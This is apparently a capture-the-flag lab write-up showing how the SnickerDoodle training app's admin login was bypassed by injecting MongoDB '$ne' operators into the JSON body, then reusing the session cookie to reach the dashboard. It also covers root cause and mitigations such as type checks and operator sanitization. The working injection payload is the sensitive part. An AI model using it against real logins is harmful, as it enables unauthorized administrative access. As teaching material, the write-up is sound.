---
title: "NoSQL Injection Authentication Bypass – Admin Panel Access | SnickerDoodle"
date: 2026-05-11 14:25:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [nosql-injection, mongodb, authentication-bypass, expressjs, json-injection, webversepro, session-hijacking]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/snickerdoodle-nosqli.webp
  alt: NoSQL Injection Authentication Bypass in SnickerDoodle Lab
---

# NoSQL Injection Authentication Bypass – Admin Panel Access | SnickerDoodle

## Overview

Snickerdoodle Bake-off is a baking competition platform that evolved from a small Discord community into a full web application used by thousands of users. The application included an administrative baker panel used internally by the staff.

During reconnaissance, an exposed admin login page revealed an insecure authentication implementation vulnerable to NoSQL Injection. By abusing MongoDB query operators inside JSON input, it was possible to bypass authentication entirely and gain access to the admin dashboard.

Inside the dashboard, the application exposed the final lab flag.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/mystery-challenges/snickerdoodle)

---

## Objective

The goal of this lab was to:

- Discover hidden functionality
- Analyze client-side application behavior
- Identify insecure backend query handling
- Exploit NoSQL Injection for authentication bypass
- Access the restricted admin dashboard
- Retrieve the flag

---

## Reconnaissance

While exploring the application manually, a hidden administrative login endpoint was discovered:

```text
https://13850bbd-4065-snickerdoodle-d17dc.events.webverselabs-pro.com/admin/login
```

The page itself appeared normal at first glance, but viewing the page source revealed an extremely important developer comment.

---

## Source Code Review

The login form submission logic was implemented using JavaScript and sent credentials as JSON.

```html
<script>
// Submit the login form as JSON, not form-urlencoded. The vulnerable
// endpoint expects JSON; this is the front-end half of the puzzle.
(function () {
  const f = document.getElementById('adminLoginForm');
  if (!f) return;
  f.addEventListener('submit', async (e) => {
    e.preventDefault();
    const body = {
      username: f.querySelector('input[name=username]').value,
      password: f.querySelector('input[name=password]').value,
    };
    const r = await fetch('/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      credentials: 'same-origin',
      redirect: 'follow',
    });

    if (r.redirected) {
      window.location = r.url;
    } else {
      const html = await r.text();
      document.open();
      document.write(html);
      document.close();
    }
  });
})();
</script>
```

The following comment immediately stood out:

```javascript
// The vulnerable endpoint expects JSON; this is the front-end half of the puzzle.
```

This strongly suggested:

- JSON-based backend processing
- Potential type confusion
- Direct object injection into database queries
- MongoDB or NoSQL backend usage

At this point, NoSQL Injection became the primary attack vector.

---

## Understanding the Vulnerability

Applications using MongoDB frequently construct authentication queries like:

```javascript
db.users.findOne({
  username: req.body.username,
  password: req.body.password
});
```

If user-controlled JSON objects are passed directly into the query without sanitization, MongoDB operators such as `$ne`, `$gt`, `$regex`, and others can manipulate the logic of the query itself.

Instead of sending strings, an attacker can send query operators.

---

## Initial Login Request

A test login attempt was performed using arbitrary credentials:

```text
kelvin:kelvin
```

Intercepting the request in Burp Suite revealed the following JSON body:

```json
{"username":"kelvin","password":"kelvin"}
```

This confirmed the application accepted raw JSON input.

---

## Exploiting the NoSQL Injection

The request body was modified to inject MongoDB operators:

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

### Why This Works

The `$ne` operator means:

```text
not equal
```

So the backend query effectively became:

```javascript
db.users.findOne({
  username: { $ne: null },
  password: { $ne: null }
});
```

This matches:

- Any user whose username is not null
- Any user whose password is not null

As a result, MongoDB returns the first matching user document, allowing authentication without valid credentials.

---

## Authentication Bypass Successful

After forwarding the malicious request, the application authenticated successfully and issued a valid session cookie:

```http
Cookie: connect.sid=s%3Ao1SIbacXDHJzNLq_rwiy7e6u2WxGGnT6...
```

This confirmed the login bypass worked successfully.

---

## Accessing the Admin Dashboard

Using the authenticated session cookie, the restricted admin dashboard became accessible.

```http
GET /admin/dashboard HTTP/2
Host: 13850bbd-4065-snickerdoodle-d17dc.events.webverselabs-pro.com
Cookie: connect.sid=YOUR_COOKIE
```

The response loaded the administrative baker panel successfully.

Inside the dashboard, the application exposed the lab flag:

```text
WEBVERSE{.....}
```

---

## Root Cause

The vulnerability existed because:

- User input was accepted as raw JSON
- MongoDB operators were not filtered
- Backend queries trusted client-controlled objects
- Authentication logic lacked input validation and sanitization

The application likely passed request body values directly into MongoDB queries without enforcing string types.

---

## Impact

This vulnerability allowed complete authentication bypass without:

- Valid credentials
- Password cracking
- User enumeration

An attacker could:

- Access administrative panels
- Hijack privileged sessions
- Read sensitive internal data
- Potentially modify application content

In real-world applications, this type of issue can lead to full account compromise and administrative takeover.

---

## Mitigation

Developers should implement the following protections:

### Enforce Strict Input Validation

Ensure username and password fields are strings:

```javascript
typeof username === 'string'
```

---

### Sanitize MongoDB Operators

Use libraries such as:

```text
express-mongo-sanitize
```

to remove dangerous operators like:

```text
$ne
$gt
$regex
$where
```

---

### Use Parameterized Authentication Logic

Never pass raw request objects directly into database queries.

Bad:

```javascript
db.users.findOne(req.body)
```

Good:

```javascript
db.users.findOne({
  username: String(req.body.username),
  password: String(req.body.password)
})
```

---

### Implement Proper Authentication Controls

- MFA for admin accounts
- Rate limiting
- Session monitoring
- Logging suspicious login patterns

---

## Real-World Insight

NoSQL Injection vulnerabilities are commonly overlooked compared to SQL Injection, but they can be equally dangerous.

Modern Node.js applications using:

- Express.js
- MongoDB
- Mongoose

are especially vulnerable when developers trust JSON input directly from the client.

The presence of JSON-based APIs combined with insufficient sanitization frequently leads to authentication bypasses exactly like this one.

---

## Key Takeaways

- Hidden comments can reveal attack vectors
- JSON-based authentication endpoints deserve careful inspection
- MongoDB operators can manipulate backend logic
- NoSQL Injection can completely bypass authentication
- Input validation is critical in modern API-driven applications

